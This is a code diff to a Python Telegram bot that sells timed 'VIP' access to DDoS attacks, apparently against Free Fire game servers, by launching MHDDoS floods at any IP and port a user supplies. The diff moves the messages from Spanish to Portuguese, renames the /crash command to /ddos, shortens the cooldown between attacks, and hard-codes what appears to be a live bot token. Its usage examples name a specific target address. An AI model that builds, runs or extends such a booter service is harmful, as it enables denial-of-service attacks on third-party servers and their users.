@@ -6,8 +6,8 @@ from threading import Lock
 import time
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "TOKEN AQUI"
-ADMIN_ID = 7178876305
+BOT_TOKEN = "8103818524:AAHdqbKS8tYtEXuJf-50aDPCHnJUKJRTisg"
+ADMIN_ID = 6772734775
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -44,16 +44,16 @@ def handle_start(message):
     if result:
         expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
         if datetime.now() > expiration_date:
-            vip_status = "❌ *Seu plano VIP expirou.*"
+            vip_status = "❌ *SEU PLANO VIP EXPIROU.*"
         else:
             dias_restantes = (expiration_date - datetime.now()).days
             vip_status = (
                 f"✅ CLIENTE VIP!\n"
-                f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
-                f"📅 Expira en: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
+                f"⏳ DIAS RESTANTES: {dias_restantes} DIAS\n"
+                f"📅 EXPIRA EM: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
             )
     else:
-        vip_status = "❌ *No tienes un plan vip activo.*"
+        vip_status = "❌ *VC NÃO TEM PLANO VIP ATIVO.*"
     markup = InlineKeyboardMarkup()
     button = InlineKeyboardButton(
         text="💻 VENDEDOR - OFICIAL 💻",
@@ -65,38 +65,38 @@ def handle_start(message):
     bot.reply_to(
         message,
         (
-            "🤖 *BIENVENIDO AL CRASH BOT [Free Fire]!*"
+            "*LEO BOT DDOS FREE FIRE!*"
             
 
             f"""
 ```
 {vip_status}```\n"""
-            "📌 *Como usar:*"
+            "📌 *COMO USAR:*"
             """
 ```
-/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
-            "💡 *Ejemplo:*"
+/ddos <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
+            "💡 *EXEMPLO:*"
             """
 ```
-/crash UDP 143.92.125.230:10013 10 900```\n"""
-            "💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+/ddos UDP 143.92.125.230:10013 10 900```\n"""
+            "VC É UM USUÁRIO VIP "
         ),
         reply_markup=markup,
         parse_mode="Markdown",
     )
 
 
-@bot.message_handler(commands=["vip"])
+@bot.message_handler(commands=["addvip"])
 def handle_addvip(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ No eres un vendededor autorizado.")
+        bot.reply_to(message, "❌ VOCÊ NÃO É UM VENDEDOR AUTORIZADO.")
         return
 
     args = message.text.split()
     if len(args) != 3:
         bot.reply_to(
             message,
-            "❌ Formato inválido. Use: `/vip <ID> <QUANTOS DIAS>`",
+            "❌ FORMATO INVÁLIDO. USE: `/addvip <ID> <QUANTOS DIAS>`",
             parse_mode="Markdown",
         )
         return
@@ -115,10 +115,10 @@ def handle_addvip(message):
         )
         conn.commit()
 
-    bot.reply_to(message, f"✅ Usuário {telegram_id} agregado como VIP por {days} dias.")
+    bot.reply_to(message, f"✅ USUÁRIO {telegram_id} ADICIONADO COMO VIP POR {days} DIAS.")
 
 
-@bot.message_handler(commands=["crash"])
+@bot.message_handler(commands=["ddos"])
 def handle_ping(message):
     telegram_id = message.from_user.id
 
@@ -130,16 +130,16 @@ def handle_ping(message):
         result = cursor.fetchone()
 
     if not result:
-        bot.reply_to(message, "❌ No tienes permiso para usar este comando.")
+        bot.reply_to(message, "❌ VOCÊ NÃO TEM PERMISSÃO PARA USAR ESTE COMANDO.")
         return
 
     expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
     if datetime.now() > expiration_date:
-        bot.reply_to(message, "❌ Su acceso vip Expiró")
+        bot.reply_to(message, "❌ SEU ACCESO VIP EXPIROU")
         return
 
-    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
-        bot.reply_to(message, "❌ Espera 10 segundos antes de iniciar otro ataque y recuerda parar el anterior.")
+    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 3:
+        bot.reply_to(message, "❌ ESPERE 3 SEGUNDOS ANTES DE COMEÇAR OUTRO ATAQUE E LEMBRE-SE DE PARAR O ANTERIOR.")
         return
 
     args = message.text.split()
@@ -147,11 +147,11 @@ def handle_ping(message):
         bot.reply_to(
             message,
             (
-                "❌ *Formato inválido!*\n\n"
-                "📌 *Uso correto:*\n"
-                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
-                "💡 *Ejemplo:*\n"
-                "`/crash UDP 143.92.125.230:10013 10 900`"
+                "❌ *FORMATO INVÁLIDO!*\n\n"
+                "📌 *USO CORRETO:*\n"
+                "`/ddos <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+                "💡 *EXEMPLO:*\n"
+                "`/ddos UDP 143.92.125.230:10013 10 900`"
             ),
             parse_mode="Markdown",
         )
@@ -168,17 +168,17 @@ def handle_ping(message):
     cooldowns[telegram_id] = time.time()
 
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))
+    markup.add(InlineKeyboardButton("⛔ PARAR ATACK", callback_data=f"stop_{telegram_id}"))
 
     bot.reply_to(
         message,
         (
-            "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
-            f"🌐 *Puerto:* {ip_port}\n"
+            "*[✅] ATACK INICIADO - 200 [✅]*\n\n"
+            f"🌐 *Porto:* {ip_port}\n"
             f"⚙️ *Tipo:* {attack_type}\n"
             f"🧟‍♀️ *Threads:* {threads}\n"
-            f"⏳ *Tiempo (ms):* {duration}\n\n"
-            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
+            f"⏳ *Tempo (ms):* {duration}\n\n"
+            f"💠 VC É UM USUÁRIO VIP 💠"
         ),
         reply_markup=markup,
         parse_mode="Markdown",
@@ -191,7 +191,7 @@ def handle_stop_attack(call):
 
     if call.from_user.id != telegram_id:
         bot.answer_callback_query(
-            call.id, "❌ Solo el usuario que inicio el ataque puede pararlo"
+            call.id, "❌ SOMENTE O USUÁRIO QUE O INICIOU ATACK PODE PARARLO"
         )
         return
 
@@ -200,9 +200,9 @@ def handle_stop_attack(call):
         process.terminate()
         del active_attacks[telegram_id]
 
-        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
+        bot.answer_callback_query(call.id, "✅ ATACK PARADO COM SUCESSO.")
         bot.edit_message_text(
-            "*[⛔] ATAQUE FINALIZADO[⛔]*",
+            "*[⛔] ATACK FINALIZADO[⛔]*",
             chat_id=call.message.chat.id,
             message_id=call.message.id,
             parse_mode="Markdown",
@@ -210,7 +210,7 @@ def handle_stop_attack(call):
         time.sleep(3)
         bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
     else:
-        bot.answer_callback_query(call.id, "❌ No se encontro ningun ataque, siga con su acción.")
+        bot.answer_callback_query(call.id, "❌ NAO SE ENCONTRO NEBYJ ATACK, SIGA COM SUA AÇÃO.")
 
 if __name__ == "__main__":
     bot.infinity_polling()
